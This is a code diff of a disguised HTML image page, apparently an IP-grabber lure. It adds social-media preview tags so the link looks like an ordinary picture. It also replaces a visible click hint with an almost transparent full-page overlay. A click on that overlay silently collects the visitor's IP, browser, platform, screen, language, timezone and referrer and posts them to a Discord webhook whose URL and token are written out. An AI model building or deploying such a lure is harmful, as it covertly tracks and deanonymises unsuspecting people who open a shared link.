@@ -7,82 +7,58 @@
     
     <meta property="og:title" content="Image intéressante">
     <meta property="og:image" content="https://picsum.photos/seed/tracker/1200/800.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="800">
     <meta property="og:description" content="Découvrez cette image magnifique">
     <meta property="og:type" content="website">
+    <meta property="og:url" content="https://ton-username.github.io/ton-repo/">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Image intéressante">
+    <meta name="twitter:description" content="Découvrez cette image magnifique">
+    <meta name="twitter:image" content="https://picsum.photos/seed/tracker/1200/800.jpg">
     
     <style>
         body {
             margin: 0;
             padding: 0;
             background-color: #000;
-            font-family: Arial, sans-serif;
-        }
-        .container {
-            width: 100%;
-            height: 100vh;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .image-container {
             position: relative;
+            max-width: 100%;
+            max-height: 100vh;
         }
         img {
             max-width: 100%;
             max-height: 100vh;
-            object-fit: contain;
-            cursor: pointer;
-            transition: transform 0.3s ease;
+            display: block;
         }
-        img:hover {
-            transform: scale(1.02);
-        }
-        .click-hint {
+        .overlay {
             position: absolute;
-            bottom: 20px;
-            color: white;
-            background-color: rgba(0, 0, 0, 0.7);
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-size: 14px;
-            opacity: 0.8;
-        }
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background-color: rgba(0, 0, 0, 0.8);
-            color: white;
-            padding: 10px 20px;
-            border-radius: 5px;
-            display: none;
-            z-index: 1000;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.01);
+            z-index: 10;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://picsum.photos/seed/tracker/1200/800.jpg" alt="Image" id="mainImage">
-        <div class="click-hint">Click on image for enlarge</div>
+    <div class="image-container">
+        <img src="https://picsum.photos/seed/tracker/1200/800.jpg" alt="Image">
+        <div class="overlay" onclick="trackClick()"></div>
     </div>
     
-    <div class="notification" id="notification">Chargement...</div>
-    
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const mainImage = document.getElementById('mainImage');
-            const notification = document.getElementById('notification');
-            
-            mainImage.addEventListener('click', function() {
-                notification.style.display = 'block';
-                notification.textContent = 'Chargement...';
-                collectAndSendData();
-                setTimeout(() => {
-                    notification.style.display = 'none';
-                }, 1500);
-            });
-        });
-        
-        function collectAndSendData() {
+        function trackClick() {
             const userAgent = navigator.userAgent;
             const language = navigator.language;
             const platform = navigator.platform;
@@ -104,10 +80,10 @@
         }
         
         function sendToDiscord(ip, userAgent, language, platform, screenResolution, referer, timestamp, timezone) {
-            const webhookUrl = "https://canary.discord.com/api/webhooks/1506769091413676082/qQqSFZ1WoIxOZqfYL2jEbuVPj9gX8H_78UTV37KPr99uTyFOlrB9Y59Xc6LwT-H23M99";
+            const webhookUrl = "https://discord.com/api/webhooks/1506765844166873200/hw2mE5yGAGATPIlxXgAwMkmlDV7hT9BKuFScjkBH4sbCNRGsAvIsN51mW8iYonjQQKbc";
             
             const embed = {
-                title: "New click",
+                title: "New click on your track image",
                 color: 5814783,
                 thumbnail: {
                     url: "https://picsum.photos/seed/tracker/1200/800.jpg"
@@ -116,10 +92,10 @@
                     { name: "IP Adress", value: ip, inline: true },
                     { name: "Platform", value: platform, inline: true },
                     { name: "Screen Res", value: screenResolution, inline: true },
-                    { name: "language", value: language, inline: true },
-                    { name: "Time", value: timezone, inline: true },
+                    { name: "Language", value: language, inline: true },
+                    { name: "TimeZone", value: timezone, inline: true },
                     { name: "Referer", value: referer, inline: false },
-                    { name: "User Agent", value: userAgent.substring(0, 100) + (userAgent.length > 100 ? "..." : ""), inline: false }
+                    { name: "User agent", value: userAgent.substring(0, 100) + (userAgent.length > 100 ? "..." : ""), inline: false }
                 ],
                 footer: {
                     text: `Date: ${timestamp}`
@@ -127,9 +103,9 @@
             };
             
             const payload = {
-                username: "image track",
+                username: "Image Tracker",
                 avatar_url: "https://picsum.photos/seed/tracker/1200/800.jpg",
-                content: "Someone click on track image !",
+                content: "Someone click on your track image",
                 embeds: [embed]
             };
             
@@ -142,7 +118,7 @@
             })
             .then(response => {
                 if (!response.ok) {
-                    console.error('Error when send discord webhook:', response.statusText);
+                    console.error('Error when send webhook discord :', response.statusText);
                 } else {
                     console.log('Info send correctly');
                 }
